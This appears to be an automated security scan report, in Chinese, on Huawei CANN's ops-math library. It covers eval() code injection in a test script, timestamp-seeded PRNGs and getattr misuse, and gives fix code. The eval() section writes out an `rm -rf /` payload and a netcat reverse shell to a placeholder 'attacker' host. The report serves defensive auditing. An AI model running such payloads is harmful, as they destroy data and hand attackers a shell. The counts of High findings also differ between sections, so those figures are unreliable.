# 漏洞扫描报告 — 已确认漏洞

**项目**: ops-math (华为 CANN 算子库 - 数学运算算子实现)
**扫描时间**: 2026-04-22
**报告范围**: 仅包含 CONFIRMED 状态的漏洞

---

## 执行摘要

本次安全扫描针对华为 CANN ops-math 算子库进行了深度漏洞分析，共发现 **10 个已确认漏洞**。其中 **2 个为 Critical 严重性**，涉及代码执行和命令注入风险，**5 个为 High 严重性**，主要集中于伪随机数生成器(PRNG)的可预测性问题。

### 关键发现

**高危攻击路径**: 扫描发现了两条可直接利用的攻击链:

1. **Python eval() 代码注入** (Critical): 测试数据生成脚本 `gen_data.py` 直接将 CLI 参数传递给 `eval()`，攻击者可执行任意 Python 代码。该漏洞存在于构建测试流程中，若构建环境被入侵可导致供应链攻击。

2. **PRNG 种子可预测性** (High): `New64()` 函数使用时间戳+线程 ID 作为熵源，当 `seed=0` 时自动生成种子。攻击者若能估计调用时间或控制线程调度，可完全预测随机数输出，影响 AI 模型权重初始化、差分隐私采样等安全敏感场景。

### 影响范围

| 类别 | 漏洞数 | 影响 |
|------|--------|------|
| Python 脚本安全 | 2 | 构建/测试流程代码执行 |
| PRNG 密码学安全 | 5 | 随机数可预测性影响 AI 安全应用 |
| unsafe_getattr | 2 | 动态属性访问风险 |
| CLI 数据流 | 1 | 测试数据生成风险 |

### 建议优先级

1. **立即修复**: 移除 `gen_data.py` 中的 `eval()` 调用，使用 `ast.literal_eval()` 或显式解析
2. **高优先级**: 为 PRNG 熵源引入硬件随机数或 `/dev/urandom`，禁止自动种子生成
3. **中优先级**: 为 `getattr()` 添加白名单验证

---

## 1. 扫描摘要

### 1.1 验证状态分布

| 状态 | 数量 | 占比 |
|------|------|------|
| LIKELY | 14 | 42.4% |
| CONFIRMED | 10 | 30.3% |
| FALSE_POSITIVE | 5 | 15.2% |
| POSSIBLE | 4 | 12.1% |
| **总计** | **33** | 100% |

### 1.2 严重性分布

| 严重性 | 数量 | 占比 |
|--------|------|------|
| Critical | 2 | 20.0% |
| High | 3 | 30.0% |
| Medium | 5 | 50.0% |
| **有效漏洞总计** | **10** | - |

### 1.3 Top 5 关键漏洞深度分析

#### 1. [VULN-001/VULN-DF-PY-001] Python eval() 代码注入 (Critical)

**文件**: `conversion/fill_diagonal_v2/tests/ut/op_kernel/fill_diagonal_v2_data/gen_data.py:21`

**漏洞代码分析**:
```python
def gen_golden_data_simple(shape, fill_value, wrap, dtype):
    fill_value = float(fill_value)
    wrap = bool(wrap)
    shape = eval(shape)  # ← 漏洞点: 直接执行 CLI 参数
    ...
    
if __name__ == "__main__":
    gen_golden_data_simple(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
```

**深度分析**: 

该测试脚本在生成算子测试数据时，直接将命令行第一个参数 `sys.argv[1]` 作为 Python 表达式执行。攻击者可通过以下方式利用:

- **直接执行**: `python gen_data.py "__import__('os').system('rm -rf /')" 0 0 float32`
- **反弹 shell**: `python gen_data.py "__import__('subprocess').run(['bash','-c','nc attacker 4444 -e /bin/bash'],shell=False)" ...`
- **供应链攻击**: 若 CI/CD 构建环境被入侵，恶意提交的参数可导致构建机器被完全控制

**根因**: 开发者期望接收张量形状如 `[3,4,5]` 并解析为列表，但 `eval()` 会执行任意 Python 表达式，而非仅解析数据结构。

**置信度**: 85/100 — CLI 参数完全可控，无任何验证

---

#### 2. [VULN-RNG-001] 可预测的 PRNG 种子生成 (High)

**文件**: `random/random_common/op_host/arch35/random_tiling_base.h:26-43`

**漏洞代码分析**:
```cpp
static inline std::mt19937_64& GetGlobalRng() {
    static std::mt19937_64 rng([]() -> uint64_t {
        auto now = std::chrono::high_resolution_clock::now();
        uint64_t seed = std::chrono::duration_cast<std::chrono::nanoseconds>(
            now.time_since_epoch()
        ).count();          // ← 主熵源: 纳秒时间戳
        
        seed ^= std::hash<std::thread::id>()(std::this_thread::get_id());  // ← 混合线程ID
        return seed;
    }());
    return rng;
}

inline uint64_t New64() {
    return GetGlobalRng()();  // ← 被 Philox RNG 调用
}
```

**深度分析**:

`New64()` 是 ops-math 随机数算子的种子生成核心函数。熵源分析:

| 熵源 | 可预测性 | 攻击窗口 |
|------|----------|----------|
| `high_resolution_clock::now()` | 纯时间戳，无硬件熵 | 窄窗口 (毫秒级可估计) |
| `thread::id hash` | 线程池固定 ID | 可枚举 |
| Mersenne Twister | 确定性 PRNG | 状态可逆向 |

**攻击场景**:

1. **AI 模型安全**: 若攻击者知道 `random_uniform_v2` 调用的大致时间，可预测权重初始化值
2. **差分隐私**: `truncated_normal_v2` 用于隐私采样，可预测种子破坏隐私保护
3. **强化学习**: 环境 RandomSeed 被预测可操纵训练结果
4. **密码学采样**: Multinomial 采样用于密钥生成时，输出可预测

**置信度**: 95/100 — 算法完全确定性，时间戳熵源可估计

---

#### 3. [VULN-RNG-004] 自动种子生成触发条件 (High)

**文件**: `random/random_common/op_host/arch35/random_tiling_base.h:87-90`

**漏洞代码分析**:
```cpp
template<int SEED_INDEX, int SEED2_INDEX>
ge::graphStatus GetKeyAndCounter(gert::TilingContext* ctx, uint32_t key[2], uint32_t counter[4])
{
    ...
    int64_t seed = *seedAttr;
    int64_t seed2 = *seed2Attr;
    if (seed == 0 && seed2 == 0) {
        seed = static_cast<int64_t>(New64());   // ← 自动种子生成
        seed2 = static_cast<int64_t>(New64());
    }
    // Philox key/counter 从种子派生
    key[0] = static_cast<uint32_t>(seed);
    key[1] = static_cast<uint32_t>(seed >> 32);
    counter[2] = static_cast<uint32_t>(seed2);
    counter[3] = static_cast<uint32_t>(seed2 >> 32);
    ...
}
```

**深度分析**:

当用户调用 `aclnnRandomUniform` 等 API 且不显式提供种子 (`seed=0, seed2=0`) 时，系统自动调用 `New64()` 生成种子。这创建了一个隐式攻击面:

- **API 调用模式**: 用户通常不指定种子，依赖"随机"行为
- **攻击窗口**: 攻击者可在受害者调用 API 后，通过时间估计复现相同随机序列
- **下游影响**: 影响算子包括 `random_uniform_v2`, `random_uniform_int_v2`, `truncated_normal_v2`, `random_standard_normal_v2`

**安全设计缺陷**: 自动种子使用可预测熵源，而非硬件 RNG 或 `/dev/urandom`

**置信度**: 95/100 — 触发条件明确，熵源可预测

---

#### 4. [VULN-RNG-002] 时间戳熵源可预测性 (High)

**文件**: `random/random_common/op_host/arch35/random_tiling_base.h:28-31`

**漏洞代码分析**:
```cpp
auto now = std::chrono::high_resolution_clock::now();
uint64_t seed = std::chrono::duration_cast<std::chrono::nanoseconds>(
    now.time_since_epoch()
).count();
```

**深度分析**:

`high_resolution_clock` 在大多数平台返回系统时钟而非真随机源。攻击者可通过以下方式估计种子:

| 攻击方法 | 可行性 | 精度 |
|----------|--------|------|
| 侧信道时间观测 | 高 | 微秒级 |
| 控制调用时序 | 高 | 可精确触发 |
| 日志/监控分析 | 中 | 毫秒级 |

**与硬件 RNG 对比**:
- `/dev/urandom`: 混合硬件熵，不可预测
- `RDRAND`: Intel CPU 硬件随机数
- 当前实现: 纯时间戳，完全可预测

**置信度**: 90/100 — 熵源纯时间戳，无硬件熵混合

---

#### 5. [VULN-RNG-005] Philox RNG 完全确定性 (High → Medium)

**文件**: `random/random_common/op_kernel/arch35/random_kernel_base.h:419-446`

**漏洞代码分析**:
```cpp
__simt_callee__ __aicore__ inline void PhiloxRandomSimt(
    const uint32_t* key, const uint32_t* counter, uint32_t* results)
{
    uint32_t keyTmp[ALG_KEY_SIZE];
    uint32_t counterTmp[ALG_COUNTER_SIZE];
    CopyArray<ALG_KEY_SIZE>(keyTmp, key);
    CopyArray<ALG_COUNTER_SIZE>(counterTmp, counter);
    
    Philox4x32Round(counterTmp, keyTmp);  // Round 1-10
    KeyInc(keyTmp);
    ...
    Philox4x32Round(counterTmp, keyTmp);  // Round 10
    CopyArray<ALG_COUNTER_SIZE>(results, counterTmp);  // ← 输出完全由 key/counter 决定
}
```

**深度分析**:

Philox 是确定性 PRNG 算法。给定相同的 `key[2]` 和 `counter[4]`，输出完全相同:

- **算法常数**: `PHILOX_W32_A=0x9E3779B9`, `PHILOX_W32_B=0xBB67AE85` (黄金比例相关)
- **迭代次数**: 固定 10 轮
- **确定性**: 相同种子 → 相同输出

**攻击链闭环**:
```
seed=0 → New64() → 时间戳种子 → key/counter派生 → Philox → 完全可预测输出
```

**设计意图 vs 安全缺陷**: Philox 设计为确定性 PRNG 用于并行计算，但不适合密码学场景。当前实现将其用于所有随机数生成，未区分用途。

**置信度**: 100/100 — 算法本质确定性，非缺陷但存在安全风险

---

## 2. 攻击面分析

### 入口点类型: aclnn API

**API 模式**: 两段式调用
```
Phase 1: aclnnXXXGetWorkspaceSize(input, output, workspaceSize, executor)
Phase 2: aclnnXXX(workspace, workspaceSize, executor, stream)
```

**攻击路径**:

| 入口点类别 | 数据类型 | 安全检查 | 缺口 |
|------------|----------|----------|------|
| API 调用入口 | aclTensor, aclIntArray | OP_CHECK_* 宏 | 无值范围验证、无溢出检查 |
| Python 构建脚本 | sys.argv, 配置文件 | 无 | eval/shell注入 |
| PRNG 种子处理 | seed/seed2 参数 | 无 | 自动种子可预测 |

**框架宏缺口**: `OP_CHECK_*` 仅验证指针非空、形状相等、维度上限，缺少:
- 张量数据内容验证 (值范围检查)
- 内存大小上限验证
- 整数溢出检查
- 并发访问保护

---

## 3. Critical 漏洞 (2)

### [VULN-001] Code Injection - main

**严重性**: Critical | **CWE**: CWE-95 | **置信度**: 85/100 | **状态**: CONFIRMED

**位置**: `conversion/fill_diagonal_v2/tests/ut/op_kernel/fill_diagonal_v2_data/gen_data.py:21`

**漏洞代码**:
```python
shape = eval(sys.argv[1])
```

**达成路径**: `sys.argv[1] → eval() → arbitrary code execution`

---

### [VULN-DF-PY-001] code_injection - gen_data

**严重性**: Critical | **CWE**: CWE-95 | **置信度**: 85/100 | **状态**: CONFIRMED

**位置**: `conversion/fill_diagonal_v2/tests/ut/op_kernel/fill_diagonal_v2_data/gen_data.py:21`

**漏洞代码**:
```python
shape = eval(sys.argv[1])
```

**达成路径**: `sys.argv[1] [SOURCE] → eval(shape) [SINK]`

---

## 4. High 漏洞 (3)

### [VULN-RNG-001] Predictable PRNG Seed Generation

**严重性**: High | **CWE**: CWE-338 | **置信度**: 95/100 | **状态**: CONFIRMED

**位置**: `random/random_common/op_host/arch35/random_tiling_base.h:26-43`

**影响算子**: `random_uniform_v2`, `random_standard_normal_v2`, `truncated_normal_v2`, `random_uniform_int_v2`

---

### [VULN-RNG-004] Auto-Seed Generation Trigger Condition

**严重性**: High | **CWE**: CWE-339 | **置信度**: 95/100 | **状态**: CONFIRMED

**位置**: `random/random_common/op_host/arch35/random_tiling_base.h:87-90`

**触发条件**: `seed=0 && seed2=0`

---

### [VULN-RNG-002] Timestamp-Based Seed Entropy

**严重性**: High | **CWE**: CWE-337 | **置信度**: 90/100 | **状态**: CONFIRMED

**位置**: `random/random_common/op_host/arch35/random_tiling_base.h:28-31`

---

## 5. Medium 漏洞 (5)

### [VULN-RNG-005] Philox RNG Complete Determinism

**严重性**: Medium | **CWE**: CWE-338 | **置信度**: 100/100 | **状态**: CONFIRMED

**位置**: `random/random_common/op_kernel/arch35/random_kernel_base.h:419-446`

---

### [VULN-RNG-003] Deterministic RNG with User-Controlled Seed

**严重性**: Medium | **CWE**: CWE-338 | **置信度**: 85/100 | **状态**: CONFIRMED

**位置**: `random/dsa_random_uniform/op_host/op_api/aclnn_multinomial.cpp:340-402`

---

### [EXP-001] unsafe_getattr

**严重性**: Medium | **CWE**: CWE-669 | **置信度**: 90/100 | **状态**: CONFIRMED

**位置**: `experimental/math/not_equal/tests/ut/op_kernel/not_equal_data/gen_data.py:17-20`

---

### [EXP-002] unsafe_getattr

**严重性**: Medium | **CWE**: CWE-669 | **置信度**: 90/100 | **状态**: CONFIRMED

**位置**: `experimental/math/not_equal/tests/ut/op_kernel/not_equal_data/compare_data.py:18`

---

### [EXP-008] sys_argv_dataflow

**严重性**: Medium | **CWE**: CWE-20 | **置信度**: 80/100 | **状态**: CONFIRMED

**位置**: `experimental/*/tests/ut/op_kernel/*_data/gen_data.py:1-40`

---

## 6. 模块漏洞分布

| 模块 | Critical | High | Medium | Low | 合计 |
|------|----------|------|--------|-----|------|
| scripts | 2 | 0 | 0 | 0 | 2 |
| random | 0 | 3 | 2 | 0 | 5 |
| experimental | 0 | 0 | 3 | 0 | 3 |
| **合计** | **2** | **3** | **5** | **0** | **10** |

## 7. CWE 分布

| CWE | 数量 | 占比 |
|-----|------|------|
| CWE-338 | 3 | 30.0% |
| CWE-95 | 2 | 20.0% |
| CWE-669 | 2 | 20.0% |
| CWE-339 | 1 | 10.0% |
| CWE-337 | 1 | 10.0% |
| CWE-20 | 1 | 10.0% |

---

## 8. 修复建议

### 8.1 Critical 漏洞修复 (立即执行)

**VULN-001/VULN-DF-PY-001: eval() 代码注入**

```python
# 当前代码 (危险):
shape = eval(sys.argv[1])

# 修复方案 1: 使用 ast.literal_eval (仅解析数据结构)
import ast
shape = ast.literal_eval(sys.argv[1])  # 仅支持列表/元组/数字

# 修复方案 2: 显式解析形状字符串
def parse_shape(shape_str):
    """解析 '[3,4,5]' 格式的形状字符串"""
    if not shape_str.startswith('[') or not shape_str.endswith(']'):
        raise ValueError("Invalid shape format")
    return [int(x.strip()) for x in shape_str[1:-1].split(',')]

shape = parse_shape(sys.argv[1])
```

### 8.2 High 漏洞修复 (高优先级)

**VULN-RNG-001/002/004: PRNG 种子可预测性**

```cpp
// 当前代码 (可预测):
auto now = std::chrono::high_resolution_clock::now();
uint64_t seed = std::chrono::duration_cast<std::chrono::nanoseconds>(
    now.time_since_epoch()
).count();

// 修复方案 1: 使用硬件熵源 (Linux)
#include <fstream>
uint64_t GetSecureSeed() {
    std::ifstream urandom("/dev/urandom", std::ios::binary);
    uint64_t seed;
    urandom.read(reinterpret_cast<char*>(&seed), sizeof(seed));
    return seed;
}

// 修复方案 2: 禁止自动种子，要求显式指定
if (seed == 0 && seed2 == 0) {
    // 不自动生成，抛出错误要求用户提供
    OP_LOGE(ctx->GetNodeName(), "Seed must be explicitly provided for security-sensitive operations.");
    return ge::GRAPH_FAILED;
}

// 修复方案 3: API 分离
// 安全敏感场景: 使用 /dev/urandom
// 并行计算场景: 允许确定性 PRNG 但标记为非加密用途
```

### 8.3 Medium 漏洞修复 (中优先级)

**EXP-001/002: unsafe_getattr**

```python
# 当前代码 (危险):
x1_type = getattr(torch, sys.argv[...])

# 修复方案: 白名单验证
ALLOWED_TYPES = {'float32', 'float16', 'int32', 'int8', 'int16', 'uint8', 'int64', 'bool'}
type_str = sys.argv[...]
if type_str not in ALLOWED_TYPES:
    raise ValueError(f"Invalid dtype: {type_str}")
x1_type = getattr(torch, type_str)
```

---

## 9. 安全架构改进建议

### 9.1 输入验证框架增强

当前 `OP_CHECK_*` 宏缺少以下检查，建议扩展:

| 检查类型 | 建议实现 |
|----------|----------|
| 张量值范围 | `OP_CHECK_VALUE_RANGE(tensor, min, max)` |
| 内存大小上限 | `OP_CHECK_MAX_SIZE(tensor, max_bytes)` |
| 整数溢出 | `OP_CHECK_MUL_OVERFLOW(a, b)` |
| 并发保护 | 添加互斥锁或原子操作 |

### 9.2 PRNG 安全分层

建议将随机数生成分为两个 API 层:

| 层级 | 用途 | 熵源 |
|------|------|------|
| 安全层 | 密码学、隐私采样 | `/dev/urandom` 或硬件 RNG |
| 性能层 | 并行计算、测试 | 确定性 PRNG (需显式种子) |

### 9.3 构建流程安全

Python 构建脚本应遵循:

- 禁止 `eval()`、`exec()` 处理外部输入
- 禁止 `shell=True` 的 subprocess 调用
- 使用 `shlex.quote()` 或参数列表形式
- 配置文件使用 schema 验证

---

**报告生成时间**: 2026-04-22
**扫描工具**: OpenCode Multi-Agent Vulnerability Scanner
**验证方法**: 数据流分析 + 源码审计 + 置信度评分